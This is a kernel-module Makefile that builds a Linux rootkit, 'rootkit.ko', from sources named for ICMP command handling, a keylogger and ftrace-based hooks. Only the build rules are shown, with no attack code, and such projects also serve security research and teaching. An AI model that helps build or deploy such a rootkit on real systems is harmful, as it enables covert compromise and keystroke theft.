KERNELDIR:=/lib/modules/$(shell uname -r)/build
EXTRA_CFLAGS := -I$(src)/inc -I$(src)/lib/inc

obj-m = rootkit.o
rootkit-objs = src/main.o src/icmp.o src/rootkit.o src/commands.o src/keylogger.o src/hooks.o lib/src/ftrace_helper.o

all: rootkit.ko

rootkit.ko: src/main.c src/icmp.c src/rootkit.c src/commands.c src/keylogger.c src/hooks.c lib/src/ftrace_helper.c
	make -C $(KERNELDIR) M=$(PWD) modules

clean:
	make -C $(KERNELDIR) M=$(PWD) clean